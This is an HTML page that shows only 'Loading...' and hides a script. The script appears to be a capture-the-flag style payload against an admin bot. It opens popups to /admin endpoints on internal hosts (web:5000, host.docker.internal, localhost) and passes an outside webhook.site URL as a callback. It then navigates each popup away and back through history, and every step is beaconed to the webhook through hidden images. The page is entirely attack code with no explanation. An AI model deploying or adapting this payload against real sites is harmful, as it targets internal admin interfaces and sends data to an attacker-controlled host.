<!DOCTYPE html>
<html>
<body>
<h1>Loading...</h1>
<img src="https://webhook.site/2e17cadc-41a3-4a6b-805c-aceaef7d539b?step=page_loaded" style="display:none">
<script>
var WH = "https://webhook.site/2e17cadc-41a3-4a6b-805c-aceaef7d539b";
var targets = ["http://web:5000","http://host.docker.internal:5000","http://localhost:5000"];

// Signal that JS is running
new Image().src = WH + "?step=js_running";

targets.forEach(function(target, i) {
  setTimeout(function() {
    var adminUrl = target + "/admin?cb=" + encodeURIComponent(WH);
    new Image().src = WH + "?step=opening_popup&target=" + encodeURIComponent(target);
    try {
      var w = window.open(adminUrl);
      if (w) {
        new Image().src = WH + "?step=popup_opened&target=" + encodeURIComponent(target);
        setTimeout(function() {
          try {
            w.location = "about:blank";
            new Image().src = WH + "?step=navigated_blank&target=" + encodeURIComponent(target);
          } catch(e) {
            new Image().src = WH + "?step=blank_error&err=" + encodeURIComponent(e.message);
          }
          setTimeout(function() {
            try {
              w.history.back();
              new Image().src = WH + "?step=history_back&target=" + encodeURIComponent(target);
            } catch(e) {
              new Image().src = WH + "?step=back_error&err=" + encodeURIComponent(e.message);
            }
          }, 1500);
        }, 3000);
      } else {
        new Image().src = WH + "?step=popup_blocked&target=" + encodeURIComponent(target);
      }
    } catch(e) {
      new Image().src = WH + "?step=open_error&err=" + encodeURIComponent(e.message);
    }
  }, i * 500);
});
</script>
</body>
</html>
